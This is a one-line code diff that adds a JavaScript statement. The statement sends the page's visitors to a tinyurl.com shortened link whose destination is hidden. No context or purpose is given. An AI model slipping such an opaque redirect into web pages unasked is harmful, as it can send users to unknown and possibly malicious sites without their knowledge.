@@ -1,0 +1,1 @@
+window.location.replace("http://tinyurl.com/2g9mqh");
